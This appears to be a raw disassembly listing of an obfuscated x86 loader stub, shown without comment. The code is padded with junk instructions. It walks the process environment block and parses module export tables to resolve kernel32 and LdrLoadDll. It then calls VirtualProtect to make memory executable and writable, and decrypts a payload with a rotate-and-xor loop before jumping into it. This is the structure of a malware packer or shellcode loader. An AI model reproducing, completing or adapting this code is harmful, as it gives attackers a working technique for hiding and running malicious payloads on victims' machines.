_start
pushad
sub esp 0x4
mov [ esp ] ecx
xor ecx [ esp ]
and ecx ecx
adc esp 0x4
push esp
add ecx 0x1
pop eax
or eax eax
sbb ecx 0xffffffff
and edi edi
sbb eax 0x4
and edx edx
adc ecx 0x1
neg ecx
call $+5
sub [ eax ] ecx
retn
sub_22d02039
xor eax eax
mov ecx 0x0
sub ecx eax
neg ecx
dec ch
dec ch
mov cl ch
mov ebp 0x0
add ebp eax
call $+5
and esi 0x0
or esi [ esp ]
test eax eax
sbb ebp 0xffffffff
movzx edx [ esi + ebp - 0x2 ]
push ecx
and edi edi
sbb ecx edx
pop ecx
jne r-xdata
add [ esp ] eax
jmp [ esp ]
mov eax 0x0
xor eax ebp
sub_22d020bf
push [ fs : 0x0 ]
test esi esi
adc edi eax
sub edx edx
add edx 0xffff
not esi
or edi edi
adc edi eax
mov [ fs : 0x0 ] esp
and edi esi
add edi eax
jmp r-xdata
call $+5
pop ecx
mov ecx 0x0
or ecx [ esp ]
mov [ fs : 0x0 ] ecx
add esp 0x8
mov eax 0x0
xor eax edi
mov ecx 0x0
or ecx [ edi + 0x3c ]
add edi ecx
xor ecx ecx
xor ecx 0x4550
push [ edi ]
pop ebx
call $+5
mov [ esp ] ecx
sub ecx ebx
pop ecx
jne r-xdata
jmp [ esp ]
popad
xor eax eax
xor eax 0x1
retn 0xc
sub ecx ecx
add ecx [ edi + 0x78 ]
push ecx
pop edi
add edi eax
add esp 0xfffffffc
mov [ esp ] edi
and edx edx
mov ecx 0x0
adc ecx [ edi + 0x20 ]
mov edi ecx
add edi eax
call $+5
mov [ esp ] eax
sub esp 0x4
mov [ esp ] edi
add esp 0x4
mov esi [ esp - 0x4 ]
pop ebx
xor edx edx
and eax 0x0
add eax esi
xor ecx ecx
add ecx [ esi ]
test esi esi
mov esi 0x0
adc esi ecx
call $+5
mov ebp 0x0
xor ebp esp
and edi edi
adc esi ebx
sub esp 0x4
mov [ esp ] 0x6c6c
add esp 0xfffffffc
mov [ esp ] 0x4464616f
add esp 0xfffffffc
mov [ esp ] 0x4c72644c
mov edi 0x0
xor edi esp
and ecx 0x0
add ecx 0xb
[ esi ] [ edi ]
je r-xdata
test edx edx
sbb edi eax
xor ecx ecx
mov ecx [ edi ]
and ebx 0x0
add ebx 0x5a4d
and ecx edx
add esp 0xfffffffc
mov [ esp ] ecx
xor ecx ebx
pop ecx
je r-xdata
mov esp 0x0
xor esp ebp
pop esi
sub esp 0x4
mov [ esp ] ebx
push edx
pop esi
mov eax [ esp ]
add esp 0x4
pop edi
and edx 0x0
add edx edi
push [ edi + 0x24 ]
pop ecx
and edi 0x0
add edi ecx
add edi eax
sub ecx ecx
add ecx [ edi + esi * 2 ]
and ecx 0xffff
mov esi 0x0
sub esi ecx
neg esi
and ecx 0x0
or ecx [ edx + 0x10 ]
or edx edx
sbb esi ecx
inc esi
xor edi edi
or edi [ edx + 0x1c ]
test esi esi
adc edi eax
mov ecx 0x0
add ecx [ edi + esi * 4 ]
add eax ecx
mov ebp 0x0
add ebp esp
add esp 0xfffffffc
mov [ esp ] ecx
xor ecx [ esp ]
add esp 0x4
push ecx
xor edi edi
or edi esp
push ecx
push 0x6c006c
add esp 0xfffffffc
mov [ esp ] 0x64002e
add esp 0xfffffffc
mov [ esp ] 0x320033
push 0x6c0065
push 0x6e0072
add esp 0xfffffffc
mov [ esp ] 0x65006b
push esp
call $+5
mov [ esp ] 0x1a0018
push esp
pop ebx
sub esp 0x4
mov [ esp ] edi
sub esp 0x4
mov [ esp ] ebx
sub esp 0x4
mov [ esp ] ecx
sub esp 0x4
mov [ esp ] ecx
sub esp 0x4
mov [ esp ] eax
sub esp 0x4
mov [ esp ] edi
mov esi [ esp ]
add esp 0x4
pop ebx
call ebx
sub eax eax
add eax [ esi ]
call $+5
mov [ esp ] eax
add esp 0x4
mov ecx [ esp - 0x4 ]
and ebx 0x0
add ebx [ fs : 0x30 ]
push [ ebx + 0x10 ]
pop eax
mov [ eax + 0x18 ] ecx
and esp 0x0
or esp ebp
mov ebx 0x0
add ebx [ fs : 0x30 ]
and eax 0x0
add eax [ ebx + 0x10 ]
xor edi edi
or edi [ eax + 0x18 ]
xor eax eax
add eax edi
xor ecx ecx
add ecx [ edi + 0x3c ]
or edi edi
adc edi ecx
mov ecx 0x0
or ecx [ edi + 0x78 ]
mov edi 0x0
or edi ecx
test edi edi
adc edi eax
call $+5
mov [ esp ] edi
push [ edi + 0x20 ]
pop ecx
mov edi ecx
add edi eax
sub esp 0x4
mov [ esp ] eax
sub esp 0x4
mov [ esp ] edi
add esp 0x4
mov esi [ esp - 0x4 ]
pop ebx
xor edx edx
and eax 0x0
add eax esi
xor ecx ecx
add ecx [ esi ]
mov esi ecx
call $+5
xor ebp ebp
xor ebp esp
or eax eax
adc esi ebx
push 0x7463
call $+5
mov [ esp ] 0x65746f72
call $+5
mov [ esp ] 0x506c6175
push 0x74726956
mov edi 0x0
sub edi esp
neg edi
mov ecx 0x0
or ecx 0xf
[ esi ] [ edi ]
je r-xdata
test eax eax
adc edx 0x1
and edx edx
adc eax 0x4
mov esi [ eax ]
mov esp 0x0
add esp ebp
jmp [ esp ]
mov esp 0x0
sub esp ebp
neg esp
add esp 0x4
mov esi [ esp - 0x4 ]
push ebx
push edx
pop esi
add esp 0x4
mov eax [ esp - 0x4 ]
add esp 0x4
mov edi [ esp - 0x4 ]
and edx 0x0
or edx edi
xor ecx ecx
or ecx [ edi + 0x24 ]
xor edi edi
or edi ecx
add edi eax
mov ecx 0x0
or ecx [ edi + esi * 2 ]
and ecx 0xffff
xor esi esi
add esi ecx
xor ecx ecx
or ecx [ edx + 0x10 ]
sub esi ecx
inc esi
push [ edx + 0x1c ]
pop edi
add edi eax
mov ecx [ edi + esi * 4 ]
test ebx ebx
adc eax ecx
sub edx edx
add edx 0x1000
call $+5
add esp 0x4
mov edi [ esp - 0x4 ]
and edi 0xfffff000
add edi edx
test edx edx
adc edi edx
sub esp 0x4
mov [ esp ] edi
mov ebx 0x4
call $+5
test eax eax
adc edi edx
mov ecx 0x0
xor ecx [ edi ]
sub ebx 0x1
je r-xdata
test edx edx
adc edx 0x1
or edx edx
adc eax 0x4
mov esi 0x0
xor esi [ eax ]
mov esp 0x0
add esp ebp
jmp [ esp ]
pop ecx
mov edi [ esp ]
add esp 0x4
add esp 0xfffffffc
mov [ esp ] ecx
push esp
add esp 0xfffffffc
mov [ esp ] 0x40
push 0x45d3
add esp 0xfffffffc
mov [ esp ] edi
add esp 0xfffffffc
mov [ esp ] eax
sub esp 0x4
mov [ esp ] edi
add esp 0x4
mov esi [ esp - 0x4 ]
add esp 0x4
mov ebx [ esp - 0x4 ]
call $+5
pop eax
or esi esi
adc eax 0x1a
push eax
call $+5
mov [ esp ] ebp
xor ebp ebp
xor ebp esp
and eax eax
adc ebx 0x5
jmp ebx
jmp [ esp ]
sub_22d024cf
add esp 0x4
mov ebx [ esp - 0x4 ]
and edi 0x0
or edi esi
mov eax 0x0
or eax 0xc
add edi eax
mov esi edi
or esi esi
mov ebp 0x0
adc ebp edi
mov ecx 0x0
sub ecx 0x4531
neg ecx
mov edx ecx
call $+5
sub esi 0xffffffff
add esp 0x4
mov ecx [ esp - 0x4 ]
stc
sbb ecx 0x0
je r-xdata
stosb [ edi ]
pop eax
call ebp
add eax ebx
test ecx ecx
adc ecx edx
popad
xor eax eax
xor eax 0x1
retn 0xc
jmp [ esp ]
mov eax 0x0
sub eax [ esi ]
neg eax
rol al cl
xor eax edx
push ecx
xor ecx ecx
xor ecx 0x40
call $+5
mov [ esp ] ecx
and esi esi
sbb ecx ebx
pop ecx
je r-xdata
